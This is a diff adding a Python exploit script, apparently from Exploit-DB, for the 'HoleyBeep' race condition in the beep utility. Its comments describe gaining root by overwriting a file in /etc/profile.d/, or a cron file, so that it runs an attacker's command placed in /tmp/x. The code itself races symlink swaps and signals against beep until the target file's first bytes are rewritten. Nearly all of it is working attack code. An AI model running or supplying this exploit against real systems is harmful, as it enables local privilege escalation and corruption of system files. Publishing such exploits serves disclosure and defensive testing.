@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+#
+# E-DB Note ~ https://gist.github.com/Arignir/0b9d45c56551af39969368396e27abe8/ec853f14afd6e86fb3f2efce2086e28f33039ddc
+# E-DB Note ~ https://sigint.sh/#/holeybeep
+#
+# This is an exploit for HoleyBeep.
+#
+# To use it, place any command you want root to execute in `/tmp/x`.
+#    ```
+#    $ cat /tmp/x
+#    echo PWNED $(whoami)
+#    ```
+# The exploit takes a path to write to (the file must already exist) and rewrites its first bytes to /*/x. This means that if it's a shell script, it will execute /tmp/x as its first and only command.
+#
+# To gain root access, the idea is to use the exploit to overwrite any file in /etc/profile.d/ so it will execute /*/x on the next login, possibly as the root user.
+#
+# Variants are possible using cron instead of the shell, so you don't have to wait until root logs in.
+#
+
+import argparse
+import shutil
+import os
+import subprocess
+import time
+import signal
+import ntpath
+
+TMP_PATH="beep_exploit"
+
+def backup_output(path):
+    backup_path = ntpath.basename(path + ".bak")
+    if os.path.isfile(path):
+        shutil.copy(path, backup_path)
+        print('Backup made at \'{}\''.format(backup_path))
+
+def main():
+    parser = argparse.ArgumentParser(description='Holey beep exploit script.')
+    parser.add_argument('output', metavar='OUTPUT', help='the output file to corrupt')
+    parser.add_argument('--path', default="/usr/bin/beep", help='path to beep')
+    parser.add_argument('--time-low', default=6000, type=int, help='time to wait (micro-seconds), lower bound')
+    parser.add_argument('--time-high', default=6900, type=int, help='time to wait (micro-seconds), higher bound')
+    parser.add_argument('--no-backup', action='store_true', help='doesn\'t backup the output file')
+    args = parser.parse_args()
+
+    if not args.no_backup:
+        backup_output(args.output)
+
+    devnull = open("/dev/null")
+
+    timer = args.time_low
+    while True:
+        # Create original symlink
+        try:
+            os.remove(TMP_PATH)
+        except OSError:
+            pass
+        os.symlink("/dev/input/event0", TMP_PATH)
+
+        # Open subprocess
+        p = subprocess.Popen([args.path,  "--device", TMP_PATH, "-l", "1", "-n", "-l", "2016356911"], stderr=devnull)
+        time.sleep(timer/2 / 1000000.0)
+
+        # Replace symlink
+        try:
+            os.remove(TMP_PATH)
+        except OSError:
+            pass
+        os.symlink(args.output, TMP_PATH)
+        time.sleep(timer/2 / 1000000.0)
+
+        # Trigger SIGINT
+        os.kill(p.pid, signal.SIGINT)
+
+        # Kill process if it's sill alive
+        time.sleep(200.0 / 1000000.0)
+        os.kill(p.pid, signal.SIGKILL)
+
+        # Verify result
+        with open(args.output, 'rb') as f:
+            data = f.read(4)
+            if data == b'/*/x':
+                print("Done!")
+                break
+
+        timer += 1
+        if timer > args.time_high:
+            timer = args.time_low
+
+if __name__ == '__main__':
+    main()
